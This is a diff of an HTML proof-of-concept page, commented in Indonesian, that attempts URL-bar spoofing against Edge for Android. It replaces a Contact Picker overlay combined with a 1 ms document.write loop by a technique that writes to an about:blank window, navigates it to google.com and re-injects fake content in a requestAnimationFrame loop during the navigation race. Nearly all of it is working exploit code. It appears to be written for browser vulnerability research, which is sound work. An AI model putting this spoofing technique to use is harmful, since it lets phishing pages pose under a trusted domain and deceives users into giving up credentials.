@@ -1,97 +1,58 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>PoC: URL Bar Spoofing & UI Redressing</title>
+    <title>PoC: Advanced Race Condition</title>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
-    <style>
-        body { 
-            font-family: 'Segoe UI', Tahoma, sans-serif; 
-            display: flex; flex-direction: column;
-            justify-content: center; align-items: center; 
-            height: 100vh; margin: 0; background-color: #f8f9fa;
-        }
-        .container {
-            padding: 20px; background: white;
-            border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            max-width: 80%;
-        }
-        .trigger-btn { 
-            padding: 15px 30px; font-size: 1.1rem; 
-            cursor: pointer; background-color: #0078d4; 
-            color: white; border: none; border-radius: 5px;
-            transition: background 0.2s;
-        }
-        .trigger-btn:active { background-color: #005a9e; }
-    </style>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
 </head>
 <body>
-
-    <div class="container">
-        <h1>Browser Security Lab</h1>
-        <p>Pengujian kerentanan Cross-Origin pada Edge for Android.</p>
-        <button class="trigger-btn" id="pocBtn">Jalankan PoC</button>
-    </div>
+    <h1>Security Test</h1>
+    <button id="pocBtn" style="padding: 20px;">Execute Advanced Bypass</button>
 
     <script>
-        document.getElementById('pocBtn').onclick = async () => {
-            // 1. Trigger Contact Picker (Overlay UI)
-            // Ini akan melayang di atas jendela baru yang kita buka
-            (async () => {
-                try {
-                    await navigator.contacts.select(["name"], { multiple: false });
-                } catch (e) {
-                    console.log("Picker closed");
-                }
-            })();
+        const fakeContent = `
+            <html>
+            <body style="background:white; color:red; text-align:center; padding-top:50px; font-family:sans-serif;">
+                <h1>SPOOFED CONTENT</h1>
+                <p>URL Bar harusnya menunjukkan google.com</p>
+                <script>
+                    // Mengunci halaman agar tidak lanjut loading
+                    window.stop(); 
+                <\/script>
+            </body>
+            </html>
+        `;
 
-            // 2. Eksekusi Race Condition Spoofing
-            // Membuka jendela ke google.com
-            let target = "https://www.google.com";
-            let win = window.open(target, "PoC_Window");
+        document.getElementById('pocBtn').onclick = () => {
+            // 1. Buka window dengan about:blank terlebih dahulu
+            let win = window.open("about:blank", "PoC_Window");
 
-            // Konten palsu yang akan disuntikkan
-            const fakeContent = `
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Google</title>
-                    <meta name="viewport" content="width=device-width,initial-scale=1">
-                    <style>
-                        body { margin: 0; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; background: #fff; }
-                        .warning { color: #d93025; padding: 20px; border: 2px solid #d93025; border-radius: 8px; }
-                    </style>
-                </head>
-                <body>
-                    <div class="warning">
-                        <h1 style="font-size: 40px;">Security Alert</h1>
-                        <p>URL di atas menunjukkan <b>google.com</b> secara sah.</p>
-                        <p>Namun, konten ini berasal dari server penyerang.</p>
-                        <hr>
-                        <p>Dialog "Select Contacts" di atas adalah bagian dari teknik UI Redressing.</p>
-                    </div>
-                </body>
-                </html>
-            `;
+            // 2. Tulis konten ke about:blank (masih satu origin dengan kita)
+            win.document.write(fakeContent);
 
-            // 3. The Injection Loop (The Bypass)
-            // Kita mencoba menulis ke document berkali-kali dalam micro-seconds
-            // untuk memotong proses 'binding' origin asli.
-            let count = 0;
-            let interval = setInterval(() => {
-                try {
-                    if (win.location.href.includes("google.com") || count > 50) {
-                        win.document.write(fakeContent);
-                        win.document.close();
-                        clearInterval(interval);
+            // 3. Picu navigasi ke Google
+            // Browser akan mulai mengganti URL bar, tapi kita akan mencoba
+            // menginterupsi proses commit document-nya.
+            setTimeout(() => {
+                win.location.href = "https://www.google.com";
+                
+                // 4. THE ATTACK: Re-inject content saat transisi
+                // Kita gunakan loop super cepat (Microtasks)
+                let attempts = 0;
+                function race() {
+                    try {
+                        // Selama navigasi 'pending', kita mungkin masih punya akses
+                        win.document.documentElement.innerHTML = fakeContent;
+                        if (attempts < 500) {
+                            attempts++;
+                            requestAnimationFrame(race);
+                        }
+                    } catch (e) {
+                        // Jika gagal (Access Denied), berarti Google sudah commit
                     }
-                    count++;
-                } catch (e) {
-                    // Jika error Cross-Origin muncul, berarti proteksi sudah aktif
-                    // Kita berhenti mencoba.
-                    clearInterval(interval);
                 }
-            }, 1); // Interval 1ms untuk memenangkan race condition
+                race();
+            }, 500);
         };
     </script>
 </body>
